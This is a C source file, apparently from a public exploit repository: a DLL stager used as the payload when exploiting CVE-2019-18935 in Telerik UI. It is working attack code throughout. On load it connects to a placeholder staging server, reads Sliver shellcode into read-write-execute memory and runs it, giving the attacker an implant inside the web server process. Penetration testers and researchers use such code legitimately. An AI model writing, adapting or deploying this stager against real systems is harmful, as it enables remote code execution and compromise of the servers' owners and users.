/* Sliver Stager for CVE-2019-18935
 *
 * Authors: @lesnuages, @noperator
 *
 * **Warning**: Sending a stage of the wrong CPU architecture will _crash_ the
 * target process! For example, if the target is running a 32-bit version of
 * Telerik UI and the staging server sends a 64-bit stage to the 32-bit stager,
 * the web server process will crash.
 *
 * This CVE-2019-18935 payload (the stager) receives and executes Sliver
 * shellcode (the stage) from the Sliver server (the staging server), following
 * Metasploit's staging protocol:
 * 1. Connect to the staging server
 * 2. Read the length of the stage on the wire
 * 3. Allocate a buffer in memory with read, write, and execute access
 * 4. Copy an assembly opcode and the socket file descriptor into the buffer
 * 5. Read the stage from the socket into the buffer
 * 6. Cast the buffer to a function and call it
 *
 * Now, to clarify some definitions: The terms "shellcode" and "payload" are a
 * bit insufficient to usefully describe what's happening at various steps of
 * remotely exploiting a vulnerability through staged code execution. This C
 * program, for example, is intended to be compiled into a mixed mode .NET
 * assembly DLL and used as a "payload" while exploiting CVE-2019-18935. When
 * loaded into a running instance of Telerik UI, this DLL in turn receives a
 * "payload" from a Sliver server to be injected into memory and subsequently
 * executed. In order to distinguish these exploitation phases from one
 * another, we'll use the following terms:
 * - Stager (AKA stage 1): This program. Connects to the staging server to
 *                         receive the stage.
 * - Stage (AKA stage 2):  Sliver shellcode. Sent from the staging server to
 *                         the stager.
 * - Staging server:       Sliver server. Receives a connection from the stager
 *                         and sends the stage.
 */

#include <winsock2.h>  // Contains most Winsock functionality.
#include <ws2tcpip.h>  // Newer functionality used to retrieve IP addresses.
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")  // Link to Winsock library file.

#define HOST "<HOST>"
#define PORT "<PORT>"
#define DEBUG 0

/*
 * Connect to the staging server. If successful, returns a working SOCKET.
 * Otherwise, if Winsock fails at any point, returns INVALID_SOCKET.
 *
 * The Windows Sockets 2 (Winsock) network programming interface can be a bit
 * tricky to use; thankfully, Microsoft has documented it pretty well. Use
 * their guide "Creating a Basic Winsock Application" as a starting point for a
 * hands-on approach to understanding and using Winsock.
 * - https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
 */

SOCKET ConnectStagingServer() {
    int iResult;

    /*
     * Initiate use of Winsock 2 DLL.
     * - https://docs.microsoft.com/en-us/windows/win32/winsock/initializing-winsock
     */

    if (DEBUG) printf("Initiate use of Winsock 2 DLL...\n");
    WSADATA wsaData;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        if (DEBUG) printf("WSAStartup failed: %d\n", iResult);
        return INVALID_SOCKET;
    }

    /*
     * Create a socket for the client.
     * - https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-socket-for-the-client
     */

    // Initialize structure to hold address information.
    // - https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-addrinfoa
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;        // IPv4
    hints.ai_socktype = SOCK_STREAM;  // Two-way connection-based byte stream
    hints.ai_protocol = IPPROTO_TCP;  // TCP

    // Resolve server address and port.
    // - https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo
    if (DEBUG) printf("Resolve server address and port...\n");
    struct addrinfo *address = NULL;
    iResult = getaddrinfo(HOST, PORT, &hints, &address);
    if (iResult != 0) {
        if (DEBUG) printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Attempt to connect to the first resolved server address.
    // - https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket
    if (DEBUG) printf("Attempt to connect to the first resolved server address...\n");
    SOCKET ConnectSocket = INVALID_SOCKET;
    ConnectSocket = socket(address->ai_family, address->ai_socktype, address->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        if (DEBUG) printf("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(address);
        WSACleanup();
        return INVALID_SOCKET;
    }

    /*
     * Connect to the socket.
     * - https://docs.microsoft.com/en-us/windows/win32/winsock/connecting-to-a-socket
     */

    // Connect to server.
    // - https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
    if (DEBUG) printf("Connect to server...\n");
    iResult = connect(ConnectSocket, address->ai_addr, (int)address->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    // Technically, if the connect call failed, we should attempt the next
    // address returned by getaddrinfo; however, for our use, we'll just free
    // the resources returned by getaddrinfo and print an error message.
    freeaddrinfo(address);
    if (ConnectSocket == INVALID_SOCKET) {
        if (DEBUG) printf("Unable to connect to server!\n");
        WSACleanup();
        return INVALID_SOCKET;
    }

    /*
     * Receive data on the client.
     * - https://docs.microsoft.com/en-us/windows/win32/winsock/sending-and-receiving-data-on-the-client
     */

    // Shut down the connection for sending, allowing the server to release
    // some of the resources for this socket. The client can still receive data
    // on the socket.
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        if (DEBUG) printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return ConnectSocket;
}

/*
 * This stager follows the six high-level steps for Metasploit's staging
 * protocol. This protocol is described in more detail on the Cobalt Strike
 * blog, and is compatible with Bishop Fox's Sliver implant framework.
 * - https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/
 * - https://github.com/BishopFox/sliver/wiki/Stagers
 *
 * For a client-side implementation of this staging protocol, see @rsmudge's
 * metasploit-loader, a C-based stager client compatible with the Metasploit
 * Framework. @SherifEldeeb has a good one, too.
 * - https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c
 * - https://github.com/SherifEldeeb/inmet/blob/master/inmet/winsock_functions.cpp
 */

DWORD WINAPI Stager(LPVOID lpParam) {
    /*
     * Step 1: Connect to the staging server.
     */

    SOCKET StagingServerSocket = ConnectStagingServer();
    if (StagingServerSocket == INVALID_SOCKET) return 1;

    /*
     * Step 2: Read the 4-byte length of the incoming stage on the wire. This
     * will be used to allocate an adequately sized buffer to hold the stage in
     * memory.
     */

    if (DEBUG) printf("Checking stage size...\n");
    int stage_size = 0;
    int count = recv(StagingServerSocket, (char *)&stage_size, 4, 0);
    if (count != 4 || stage_size <= 0) {
        if (DEBUG) printf("Unable to read stage size\n");
        return 1;
    } else {
        if (DEBUG) printf("Stage size: %d\n", stage_size);
    }

    /*
     * Step 3: Allocate a buffer in memory for the stage with read, write, and
     * execute access, according to the size we just read.
     * - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
     */

    if (DEBUG) printf("Allocating memory...\n");
    unsigned char *buffer = (unsigned char *)VirtualAlloc(
        0,                      // Starting address of the region to allocate.
        stage_size + 5,         // Create enough space for assembly opcode, socket file descriptor, and stage.
        MEM_COMMIT,             // Allocate memory and initialize to zero.
        PAGE_EXECUTE_READWRITE  // Enable read/write/execute permissions.
    );

    /*
     * Step 4: Prepend a "MOV REG, IMM" assembly instruction (i.e., 0xB8-based
     * opcode plus socket file descriptor) to the EDI register. For example:
     * BF 78 56 34 12  => mov edi, 0x12345678
     * - https://breakdev.org/x86-shellcode-obfuscation-part-1/#movregimm
     * - http://ref.x86asm.net/coder32.html#xB8
     */

    buffer[0] = 0xBF;  // 0xB8 + 0x07
    memcpy(buffer + 1, &StagingServerSocket, 4);

    /*
     * Step 5: Read the stage from the socket into the buffer.
     */

    if (DEBUG) printf("Injecting stage...\n");
    int index = 0;
    int received = 0;
    int remaining = stage_size;
    do {
        received = recv(StagingServerSocket, ((char *)(buffer + 5 + index)), remaining, 0);
        index += received;
        remaining -= received;
        if (DEBUG) printf("Bytes left: %d\n", remaining);
    } while (remaining > 0);

    /*
     * Step 6: Cast the buffer to a function, call it to execute the stage,
     * close the socket, and terminate use of Winsock 2 DLL to release
     * resources.
     * - https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsacleanup
     */

    if (DEBUG) printf("Executing stage...\n");
    void (*func)() = (void (*)())buffer;
    func();

    if (DEBUG) printf("Closing the socket...\n");
    closesocket(StagingServerSocket);
    WSACleanup();
    return 0;
}

/* Entry point into a dynamic-link library (DLL). Normally called when the DLL
 * is loaded using the C LoadLibrary function. In order to support DLLs being
 * converted to mixed mode .NET assemblies, the DllMain function is also called
 * when using the C# AssemblyInstaller class to load a mixed mode assembly DLL.
 * - https://threatvector.cylance.com/en_us/home/implications-of-loading-net-assemblies.html
 * - https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain
 * - https://docs.microsoft.com/en-us/dotnet/api/system.configuration.install.assemblyinstaller
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL,  // Handle to the DLL module (base address of the DLL).
                    DWORD fdwReason,     // Reason why the DLL entry point function is being called.
                    LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH)  // DLL is being loaded into the current process's virtual address space.

        // Create a thread to execute within the calling process's virtual address space.
        // - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
        CreateThread(NULL,    // The handle cannot be inherited.
                     0,       // Use default stack size for the executable.
                     Stager,  // Function to be executed by the thread.
                     NULL,    // Variable to be passed to the thread.
                     0,       // Run thread immediately after creation.
                     NULL     // Do not return a thread identifier.
        );

    return TRUE;
}
